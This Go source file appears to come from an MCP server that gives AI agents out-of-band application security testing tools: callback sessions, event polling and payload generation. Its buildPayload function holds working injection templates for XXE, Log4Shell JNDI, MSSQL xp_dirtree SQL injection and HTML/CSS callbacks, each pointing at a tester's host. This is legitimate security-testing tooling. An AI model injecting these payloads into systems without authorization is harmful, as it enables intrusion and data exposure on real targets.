// Copyright 2026 Davide Guerri <davide.guerri@gmail.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package mcp

import (
	"context"
	"errors"
	"fmt"
	"time"

	"github.com/google/uuid"
	mcpgo "github.com/mark3labs/mcp-go/mcp"
	mcpserver "github.com/mark3labs/mcp-go/server"
	"github.com/dguerri/oast-mcp/internal/auth"
	"github.com/dguerri/oast-mcp/internal/store"
)

// eventView is the JSON representation of a store.Event returned by MCP tools.
type eventView struct {
	EventID    string         `json:"event_id"`
	SessionID  string         `json:"session_id"`
	ReceivedAt string         `json:"received_at"`
	Protocol   string         `json:"protocol"`
	SrcIP      string         `json:"src_ip"`
	Data       map[string]any `json:"data"`
}

// toEventViews converts a slice of store event pointers to their JSON view.
func toEventViews(events []*store.Event) []eventView {
	out := make([]eventView, 0, len(events))
	for _, ev := range events {
		out = append(out, eventView{
			EventID:    ev.EventID,
			SessionID:  ev.SessionID,
			ReceivedAt: ev.ReceivedAt.Format(time.RFC3339),
			Protocol:   ev.Protocol,
			SrcIP:      ev.SrcIP,
			Data:       ev.Data,
		})
	}
	return out
}

// isValidLabel validates a payload label: alphanumeric + hyphens, 1–63 chars.
func isValidLabel(s string) bool {
	if len(s) == 0 || len(s) > 63 {
		return false
	}
	for _, c := range s {
		if (c < 'a' || c > 'z') && (c < 'A' || c > 'Z') &&
			(c < '0' || c > '9') && c != '-' {
			return false
		}
	}
	return true
}

// buildPayload returns a ready-to-inject string for the given payload type.
// Returns empty string for unknown types.
func buildPayload(payloadType, host, httpURL, httpsURL string) string {
	switch payloadType {
	case "url":
		return httpsURL
	case "xxe":
		return fmt.Sprintf(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "%s">]><foo>&xxe;</foo>`, httpURL)
	case "ssrf":
		return httpsURL
	case "log4j":
		return fmt.Sprintf("${jndi:ldap://%s/a}", host)
	case "img-tag":
		return fmt.Sprintf(`<img src="%s">`, httpsURL)
	case "css-import":
		return fmt.Sprintf(`@import url("%s");`, httpsURL)
	case "sqli-oob":
		return fmt.Sprintf(`'; EXEC master.dbo.xp_dirtree '\\%s\a'--`, host)
	default:
		return ""
	}
}

// registerTools registers all four OAST tools with the MCP server.
func (s *Server) registerTools() {
	createTool := mcpgo.NewTool("oast_create_session",
		mcpgo.WithDescription("Create a new OAST (Out-of-Band Application Security Testing) session. Returns a session_id and callback endpoints for DNS, HTTP, and HTTPS interactions. IMPORTANT: save the returned session_id — you must pass it unchanged to oast_generate_payload, oast_wait_for_event, oast_list_events, and oast_close_session. Never mix session IDs across calls."),
		mcpgo.WithNumber("ttl_seconds", mcpgo.Description("Session lifetime in seconds (default: 3600)")),
		mcpgo.WithArray("tags", mcpgo.WithStringItems(), mcpgo.Description("Optional tags to associate with the session")),
	)

	listTool := mcpgo.NewTool("oast_list_sessions",
		mcpgo.WithDescription("List all active OAST sessions for the current tenant."),
	)

	listEventsTool := mcpgo.NewTool("oast_list_events",
		mcpgo.WithDescription("Retrieve recorded OAST interaction events for a session. Returns events that have already arrived — use this to review interactions after waiting, summarize a session, or page through history. To block and wait for the next new callback after injecting a payload, use oast_wait_for_event instead. Paginated via cursor."),
		mcpgo.WithString("session_id", mcpgo.Required(), mcpgo.Description("The session ID to poll events for")),
		mcpgo.WithString("cursor", mcpgo.Description("Pagination cursor from previous poll (optional)")),
		mcpgo.WithNumber("limit", mcpgo.Description("Maximum number of events to return (default: 50, max: 200)")),
	)

	closeTool := mcpgo.NewTool("oast_close_session",
		mcpgo.WithDescription("Close an OAST session, stopping further event collection."),
		mcpgo.WithString("session_id", mcpgo.Required(), mcpgo.Description("The session ID to close")),
	)

	waitTool := mcpgo.NewTool("oast_wait_for_event",
		mcpgo.WithDescription("Block until at least one new OAST interaction arrives for a session, then return it. Use this immediately after injecting a payload into the TARGET to detect callbacks in real time. Returns timed_out=true if no event arrives within the timeout.\n\nCRITICAL: pass the SAME session_id used in oast_generate_payload. Events are only recorded when the TARGET's server triggers the injected payload — curling the callback URL from the operator machine does NOT produce an event here because it belongs to a different session or tenant context. If timed_out keeps returning true, verify that: (1) the payload was actually injected into the target, not just fetched locally, and (2) the session_id matches the one from oast_create_session."),
		mcpgo.WithString("session_id", mcpgo.Required(), mcpgo.Description("The session ID to wait on")),
		mcpgo.WithNumber("timeout_seconds", mcpgo.Description("How long to wait in seconds (1–30, default 10)")),
		mcpgo.WithString("cursor", mcpgo.Description("Wait for events after this cursor (optional)")),
	)

	generateTool := mcpgo.NewTool("oast_generate_payload",
		mcpgo.WithDescription("Generate a ready-to-inject payload string for a given OAST session. Use this right before injecting into the target — the payload embeds a unique callback URL tied to the session. When the TARGET (not you) triggers the payload (DNS lookup or HTTP request), it appears as an event retrievable with oast_wait_for_event.\n\nCRITICAL RULES:\n1. Pass the SAME session_id you got from oast_create_session — using a different or stale session_id means oast_wait_for_event will never see the callback.\n2. NEVER curl or fetch the payload URL yourself to test it. The whole point is to inject the payload into the TARGET and let the target's server call back. Self-testing from the operator machine proves nothing.\n\nAn optional label tags the injection point (e.g. 'login-form', 'ua-header'); it appears as a subdomain in the callback URLs so you can immediately tell which injection point fired. The dns_hostname field is always returned regardless of type and can be used directly in any injection context (nslookup, dig, ping, /dev/tcp, wget, python) when the generated payload string doesn't fit."),
		mcpgo.WithString("session_id", mcpgo.Required(), mcpgo.Description("The session ID")),
		mcpgo.WithString("type", mcpgo.Required(), mcpgo.Description("Payload type: url, xxe, ssrf, log4j, img-tag, css-import, sqli-oob. If not otherwise specified, start with url — the returned dns_hostname triggers a DNS callback even when HTTP egress is blocked.")),
		mcpgo.WithString("label", mcpgo.Description("Injection-point label, e.g. 'login-form' (alphanumeric + hyphens, max 63 chars)")),
	)

	s.mcp.AddTool(createTool, s.handleCreateSession)
	s.mcp.AddTool(listTool, s.handleListSessions)
	s.mcp.AddTool(listEventsTool, s.handleListEvents)
	s.mcp.AddTool(closeTool, s.handleCloseSession)
	s.mcp.AddTool(waitTool, s.handleWaitForEvent)
	s.mcp.AddTool(generateTool, s.handleGeneratePayload)
}

// handleCreateSession handles the oast_create_session tool call.
func (s *Server) handleCreateSession(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "oast:write"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "session.create", "denied"))
		return toolError("insufficient scope: oast:write required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	ttlSeconds := req.GetInt("ttl_seconds", 3600)
	tags := req.GetStringSlice("tags", nil)

	ttl := time.Duration(ttlSeconds) * time.Second
	sessionID := uuid.New().String()
	now := time.Now().UTC()

	endpoints, err := s.ia.NewSession(ctx, sessionID, claims.TenantID)
	if err != nil {
		s.logger.Error("failed to create oast session", "error", err)
		return toolError("failed to create session: " + err.Error())
	}

	sess := &store.Session{
		SessionID:     sessionID,
		TenantID:      claims.TenantID,
		CorrelationID: endpoints.CorrelationID,
		CreatedAt:     now,
		ExpiresAt:     now.Add(ttl),
		Tags:          tags,
	}
	if err := s.store.CreateSession(ctx, sess); err != nil {
		s.logger.Error("failed to store session", "error", err)
		return toolError("failed to store session: " + err.Error())
	}

	ev := s.newAuditEvent(ctx, "session.create", "ok")
	ev.Resource = sessionID
	s.audit.Log(ev)

	result := map[string]any{
		"session_id": sessionID,
		"endpoints": map[string]string{
			"correlation_id": endpoints.CorrelationID,
			"dns":            endpoints.DNS,
			"http":           endpoints.HTTP,
			"https":          endpoints.HTTPS,
		},
		"created_at": now.Format(time.RFC3339),
		"expires_at": sess.ExpiresAt.Format(time.RFC3339),
		"tags":       tags,
	}
	return toolJSON(result)
}

// handleListSessions handles the oast_list_sessions tool call.
func (s *Server) handleListSessions(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "oast:read"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "session.list", "denied"))
		return toolError("insufficient scope: oast:read required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	sessions, err := s.store.ListSessions(ctx, claims.TenantID)
	if err != nil {
		s.logger.Error("failed to list sessions", "error", err)
		return toolError("failed to list sessions: " + err.Error())
	}

	s.audit.Log(s.newAuditEvent(ctx, "session.list", "ok"))

	type sessionView struct {
		SessionID string   `json:"session_id"`
		TenantID  string   `json:"tenant_id"`
		CreatedAt string   `json:"created_at"`
		ExpiresAt string   `json:"expires_at"`
		ClosedAt  *string  `json:"closed_at,omitempty"`
		Tags      []string `json:"tags"`
	}

	views := make([]sessionView, 0, len(sessions))
	for _, sess := range sessions {
		v := sessionView{
			SessionID: sess.SessionID,
			TenantID:  sess.TenantID,
			CreatedAt: sess.CreatedAt.Format(time.RFC3339),
			ExpiresAt: sess.ExpiresAt.Format(time.RFC3339),
			Tags:      sess.Tags,
		}
		if sess.ClosedAt != nil {
			s := sess.ClosedAt.Format(time.RFC3339)
			v.ClosedAt = &s
		}
		views = append(views, v)
	}

	return toolJSON(views)
}

// errSessionExpired is returned by getActiveSession when the session exists
// but its ExpiresAt timestamp is in the past.
var errSessionExpired = errors.New("session expired")

// getActiveSession loads a session, verifies it belongs to the given tenant,
// and confirms it has not yet expired.  Returns store.ErrNotFound if the row
// doesn't exist and errSessionExpired if the row exists but ExpiresAt < now.
func (s *Server) getActiveSession(ctx context.Context, sessionID, tenantID string) (*store.Session, error) {
	sess, err := s.store.GetSession(ctx, sessionID, tenantID)
	if err != nil {
		return nil, err
	}
	if time.Now().UTC().After(sess.ExpiresAt) {
		return nil, errSessionExpired
	}
	return sess, nil
}

// handleListEvents handles the oast_list_events tool call.
func (s *Server) handleListEvents(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "oast:read"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "session.poll", "denied"))
		return toolError("insufficient scope: oast:read required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	sessionID := req.GetString("session_id", "")
	if sessionID == "" {
		return toolError("session_id is required")
	}
	cursor := req.GetString("cursor", "")
	limit := req.GetInt("limit", 50)
	if limit > 200 {
		limit = 200
	}
	if limit <= 0 {
		limit = 50
	}

	// Verify session belongs to this tenant and has not expired.
	if _, err := s.getActiveSession(ctx, sessionID, claims.TenantID); err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("session not found")
		}
		if errors.Is(err, errSessionExpired) {
			return toolError("session expired")
		}
		s.logger.Error("failed to get session", "error", err)
		return toolError("failed to get session")
	}

	events, nextCursor, err := s.store.PollEvents(ctx, sessionID, claims.TenantID, cursor, limit)
	if err != nil {
		s.logger.Error("failed to poll events", "error", err)
		return toolError("failed to poll events: " + err.Error())
	}

	// Update cursor if it changed
	if nextCursor != cursor {
		if updateErr := s.store.UpdateSessionCursor(ctx, sessionID, claims.TenantID, nextCursor); updateErr != nil {
			s.logger.Warn("failed to update session cursor", "error", updateErr)
		}
	}

	ev := s.newAuditEvent(ctx, "session.poll", "ok")
	ev.Resource = sessionID
	s.audit.Log(ev)

	views := toEventViews(events)

	result := map[string]any{
		"events":      views,
		"next_cursor": nextCursor,
	}
	return toolJSON(result)
}

// handleCloseSession handles the oast_close_session tool call.
func (s *Server) handleCloseSession(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "oast:write"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "session.close", "denied"))
		return toolError("insufficient scope: oast:write required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	sessionID := req.GetString("session_id", "")
	if sessionID == "" {
		return toolError("session_id is required")
	}

	err := s.store.CloseSession(ctx, sessionID, claims.TenantID)
	if err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("session not found")
		}
		s.logger.Error("failed to close session", "error", err)
		return toolError("failed to close session: " + err.Error())
	}

	ev := s.newAuditEvent(ctx, "session.close", "ok")
	ev.Resource = sessionID
	s.audit.Log(ev)

	result := map[string]any{
		"session_id": sessionID,
		"status":     "closed",
	}
	return toolJSON(result)
}

// handleWaitForEvent handles the oast_wait_for_event tool call.
func (s *Server) handleWaitForEvent(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "oast:read"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "session.wait", "denied"))
		return toolError("insufficient scope: oast:read required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	sessionID := req.GetString("session_id", "")
	if sessionID == "" {
		return toolError("session_id is required")
	}
	cursor := req.GetString("cursor", "")
	timeoutSecs := req.GetInt("timeout_seconds", 10)
	if timeoutSecs < 1 {
		timeoutSecs = 1
	}
	if timeoutSecs > 30 {
		timeoutSecs = 30
	}

	if _, err := s.getActiveSession(ctx, sessionID, claims.TenantID); err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("session not found")
		}
		if errors.Is(err, errSessionExpired) {
			return toolError("session expired")
		}
		s.logger.Error("failed to get session", "error", err)
		return toolError("failed to get session")
	}

	outcome := "ok"
	defer func() {
		ev := s.newAuditEvent(ctx, "session.wait", outcome)
		ev.Resource = sessionID
		s.audit.Log(ev)
	}()

	deadline := time.Now().Add(time.Duration(timeoutSecs) * time.Second)
	events, nextCursor, pollOutcome, err := s.pollUntilEvent(ctx, sessionID, claims.TenantID, cursor, deadline)
	outcome = pollOutcome
	if err != nil {
		return toolError("failed to poll events: " + err.Error())
	}
	if len(events) > 0 {
		if nextCursor != cursor {
			if updateErr := s.store.UpdateSessionCursor(ctx, sessionID, claims.TenantID, nextCursor); updateErr != nil {
				s.logger.Warn("failed to update session cursor", "error", updateErr)
			}
		}
		return toolJSON(map[string]any{
			"events":      toEventViews(events),
			"next_cursor": nextCursor,
			"timed_out":   false,
		})
	}
	return toolJSON(map[string]any{
		"events":      []eventView{},
		"next_cursor": cursor,
		"timed_out":   true,
	})
}

// pollUntilEvent polls the store every 250ms until an event arrives, the
// deadline elapses, or the context is cancelled. Returns the outcome string
// ("ok", "timed_out", "cancelled", "error") for audit logging.
func (s *Server) pollUntilEvent(ctx context.Context, sessionID, tenantID, cursor string, deadline time.Time) ([]*store.Event, string, string, error) {
	ticker := time.NewTicker(250 * time.Millisecond)
	defer ticker.Stop()
	for {
		events, nextCursor, err := s.store.PollEvents(ctx, sessionID, tenantID, cursor, 50)
		if err != nil {
			return nil, cursor, "error", err
		}
		if len(events) > 0 {
			return events, nextCursor, "ok", nil
		}
		if !time.Now().Before(deadline) {
			return nil, cursor, "timed_out", nil
		}
		select {
		case <-ctx.Done():
			return nil, cursor, "cancelled", nil
		case <-ticker.C:
		}
	}
}

// handleGeneratePayload handles the oast_generate_payload tool call.
func (s *Server) handleGeneratePayload(ctx context.Context, req mcpgo.CallToolRequest) (*mcpgo.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "oast:read"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "session.generate_payload", "denied"))
		return toolError("insufficient scope: oast:read required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	sessionID := req.GetString("session_id", "")
	if sessionID == "" {
		return toolError("session_id is required")
	}
	payloadType := req.GetString("type", "")
	if payloadType == "" {
		return toolError("type is required")
	}
	label := req.GetString("label", "")
	if label != "" && !isValidLabel(label) {
		return toolError("label must contain only alphanumeric characters and hyphens (max 63 chars)")
	}

	sess, err := s.getActiveSession(ctx, sessionID, claims.TenantID)
	if err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("session not found")
		}
		if errors.Is(err, errSessionExpired) {
			return toolError("session expired")
		}
		s.logger.Error("failed to get session", "error", err)
		return toolError("failed to get session")
	}

	var host string
	if label != "" {
		host = fmt.Sprintf("%s-%s.%s", sess.CorrelationID, label, s.domain)
	} else {
		host = fmt.Sprintf("%s.%s", sess.CorrelationID, s.domain)
	}
	httpURL := "http://" + host + "/"
	httpsURL := "https://" + host + "/"

	payload := buildPayload(payloadType, host, httpURL, httpsURL)
	if payload == "" {
		return toolError("unknown payload type: " + payloadType)
	}

	ev := s.newAuditEvent(ctx, "session.generate_payload", "ok")
	ev.Resource = sessionID
	s.audit.Log(ev)

	return toolJSON(map[string]any{
		"dns_hostname": host,
		"http_url":     httpURL,
		"https_url":    httpsURL,
		"payload":      payload,
	})
}

// CallTool calls a tool handler directly with the given context and arguments.
// This is used for testing to bypass the HTTP layer.
func (s *Server) CallTool(ctx context.Context, name string, args map[string]any) (*mcpgo.CallToolResult, error) {
	req := mcpgo.CallToolRequest{}
	req.Params.Name = name
	req.Params.Arguments = args

	handlers := map[string]mcpserver.ToolHandlerFunc{
		"oast_create_session":   s.handleCreateSession,
		"oast_list_sessions":    s.handleListSessions,
		"oast_list_events":      s.handleListEvents,
		"oast_close_session":    s.handleCloseSession,
		"oast_wait_for_event":   s.handleWaitForEvent,
		"oast_generate_payload": s.handleGeneratePayload,
	}
	for k, v := range s.agentHandlers() {
		handlers[k] = v
	}

	h, ok := handlers[name]
	if !ok {
		return toolError("unknown tool: " + name)
	}
	return h(ctx, req)
}
